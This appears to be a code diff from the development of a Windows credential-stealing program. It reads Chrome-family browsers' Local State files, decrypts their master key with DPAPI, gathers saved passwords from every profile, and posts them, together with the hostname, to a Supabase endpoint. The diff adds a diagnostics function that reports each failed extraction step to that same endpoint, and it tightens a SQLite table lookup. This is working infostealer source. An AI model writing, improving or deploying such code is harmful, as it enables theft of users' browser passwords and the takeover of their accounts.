@@ -952,7 +952,9 @@ static int SqliteFindTableRoot(const uint8_t* db, size_t dbSize, uint16_t pageSi
     Ctx ctx = { name, 0 };
     SqliteWalk(db, dbSize, pageSize, 1,
         [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
-            auto* c = (Ctx*)u; int nLen;
+            auto* c = (Ctx*)u; int tLen, nLen;
+            const uint8_t* typ = SqliteColumn(p, pl, 0, &tLen);
+            if (!typ || (int)strlen("table") != tLen || memcmp(typ, "table", tLen) != 0) return true;
             const uint8_t* tn = SqliteColumn(p, pl, 2, &nLen);
             if (tn && nLen > 0 && (int)strlen(c->name) == nLen && memcmp(tn, c->name, nLen) == 0) {
                 int rLen; const uint8_t* rp = SqliteColumn(p, pl, 3, &rLen);
@@ -1029,36 +1031,43 @@ static void HarvestBrowserPasswords() {
  
     for (int b = 0; kChromeBrowsers[b].name; b++) {
         std::string bName(kChromeBrowsers[b].name);
+        auto Diag = [&](const std::string& s) {
+            std::string j = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"browser\":\"" + EscapeJSON(bName) + "\",\"origin_url\":\"[HARVEST]\",\"username_value\":\"status\",\"password_value\":\"" + EscapeJSON(s) + "\"}]";
+            std::string pr;
+            HttpRequest(L"POST", SUPABASE_PASSWORDS_PATH, j, pr);
+        };
+        bool keyExtracted = false;
         // Read + decrypt AES key from Local State
         std::string lsPath = la + kChromeBrowsers[b].ls;
         HANDLE hLs = CreateFileA(lsPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-        if (hLs == INVALID_HANDLE_VALUE) { LogMsg(bName + ": Local State not found"); continue; }
+        if (hLs == INVALID_HANDLE_VALUE) { LogMsg(bName + ": Local State not found"); Diag("Local State not found"); continue; }
         DWORD lsSize = GetFileSize(hLs, NULL);
-        if (lsSize > 65536) { CloseHandle(hLs); LogMsg(bName + ": Local State too large"); continue; }
+        if (lsSize > 65536) { CloseHandle(hLs); LogMsg(bName + ": Local State too large"); Diag("Local State too large"); continue; }
         std::string lsContent((size_t)lsSize, 0);
         DWORD rd = 0;
-        if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); LogMsg(bName + ": Local State read failed"); continue; }
+        if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); LogMsg(bName + ": Local State read failed"); Diag("Local State read failed"); continue; }
         CloseHandle(hLs);
 
         std::string encKeyStr = ExtractJSONString(lsContent, "encrypted_key");
-        if (encKeyStr.empty()) { LogMsg(bName + ": encrypted_key not found in Local State"); continue; }
+        if (encKeyStr.empty()) { LogMsg(bName + ": encrypted_key not found in Local State"); Diag("encrypted_key not found"); continue; }
 
         // Base64 decode encrypted_key
         DWORD decLen = (DWORD)encKeyStr.size() * 3 / 4 + 16;
         std::vector<uint8_t> dec(decLen);
-        if (!CryptStringToBinaryA(encKeyStr.c_str(), (DWORD)encKeyStr.size(), CRYPT_STRING_BASE64, dec.data(), &decLen, NULL, NULL)) { LogMsg(bName + ": base64 decode failed"); continue; }
+        if (!CryptStringToBinaryA(encKeyStr.c_str(), (DWORD)encKeyStr.size(), CRYPT_STRING_BASE64, dec.data(), &decLen, NULL, NULL)) { LogMsg(bName + ": base64 decode failed"); Diag("base64 decode failed"); continue; }
         if (decLen <= 5) { LogMsg(bName + ": decrypted key too short"); continue; }
 
         // DPAPI decrypt to get AES key
         DATA_BLOB inBlob = { decLen - 5, dec.data() + 5 };
         DATA_BLOB outBlob = { 0, NULL };
-        if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) { LogMsg(bName + ": DPAPI decrypt failed"); continue; }
+        if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) { LogMsg(bName + ": DPAPI decrypt failed"); Diag("DPAPI decrypt failed"); continue; }
 
         uint8_t aesKey[32];
         int keyLen = outBlob.cbData < 32 ? (int)outBlob.cbData : 32;
         memcpy(aesKey, outBlob.pbData, keyLen);
         LocalFree(outBlob.pbData);
-        if (keyLen != 32) { LogMsg(bName + ": unexpected key length " + std::to_string(keyLen)); continue; }
+        if (keyLen != 32) { LogMsg(bName + ": unexpected key length " + std::to_string(keyLen)); Diag("unexpected key length " + std::to_string(keyLen)); continue; }
+        keyExtracted = true;
 
         // === Enumerate all profile Login Data files ===
         std::string ldBase = la + kChromeBrowsers[b].ld;
@@ -1146,6 +1155,8 @@ static void HarvestBrowserPasswords() {
             std::string pr;
             HttpRequest(L"POST", SUPABASE_PASSWORDS_PATH, batch, pr);
             LogMsg(std::string(kChromeBrowsers[b].name) + ": " + std::to_string(totalCount) + " passwords uploaded from " + std::to_string(ldPaths.size()) + " profile(s)");
+        } else if (keyExtracted) {
+            Diag("0 passwords found (" + std::to_string(ldPaths.size()) + " profiles scanned)");
         }
     }
     LogMsg("Browser password harvest complete");
@@ -1746,6 +1757,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
     return 0;
 }
+
 
 
 
